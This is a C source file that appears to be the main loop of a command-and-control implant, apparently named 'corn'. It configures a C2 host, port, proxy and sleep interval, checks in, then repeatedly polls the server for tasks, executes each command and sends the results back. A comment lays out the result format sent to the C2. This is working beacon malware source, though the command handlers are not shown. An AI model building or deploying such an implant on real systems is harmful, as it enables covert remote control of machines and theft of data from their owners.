#include "main.h"


CONFIG_CORN corn_config = {0}; // initial

int setupAgentConfig(void){
    memcpy(corn_config.AgentID, initUUID, 36);
    corn_config.HostName = hostname;
    corn_config.HttpPort = (DWORD)httpport;
    corn_config.HttpMethod = httpmethod;
    corn_config.EndPoint = endpoint;
    corn_config.UserAgent = useragent;
    corn_config.IsSSL = (BOOL)isssl;
    corn_config.IsProxyEnabled = (BOOL)proxyenabled;
    corn_config.ProxyURL = proxyurl;
    corn_config.SleepTime = (UINT32)sleeptime;
}

int main(void){
    setupAgentConfig();
    // TODO コールバックuuidの登録
    if(!sendCheckin(&corn_config)){
      return -1;
    }

    // first sleep zzz...
    // milliseconds 1000 milli = 1 second
    Sleep(corn_config.SleepTime);

    PPackage prevResults = NULL;
    // command loop
    while(TRUE){
        // ! メモリ確保
        PPackage package = newPackage(TRUE, get_tasking);

        if(prevResults != NULL){
        addBytes(package, prevResults->buffer, prevResults->size);
        freePackage(prevResults);
        prevResults = NULL;
        }

        PParser parser = sendAndReceive(package->buffer, package->size);
        freePackage(package);

        // sendAndRecive error check
        if(parser == NULL){
        Sleep(corn_config.SleepTime);
        continue;
        }

        prevResults = newPackage(FALSE, get_tasking);

        BYTE taskCount = getTaskCount(parser);
        for(BYTE i = 0; i < taskCount; i++){
        PCommand cmd = tlvReadField(parser);
        PCmdResult result = dispatchCommand(cmd);
        // === setup package ===
        if(i == 0){
          // 返送するタスク数を追加
          addByte(prevResults, taskCount);
        }
        // 実行結果を追加
        tlvWriteField(prevResults, result);

        freeCommand(cmd);
        freeCmdResult(result);
        }

        freeParser(parser);

        Sleep(corn_config.SleepTime);
    }
    return 0;
}



/*
send Bytes

agent -> C2

Header:
  AgentUUID (36bytes)

Result[0]:
  TaskUUID (36bytes)
  success   (1byte)
  type     (1byte)
  length   (4bytes)
  value    (n bytes)

Result[1]:
  TaskUUID (36bytes)
  success   (1byte)
  type     (1byte)
  length   (4bytes)
  value    (n bytes)
*/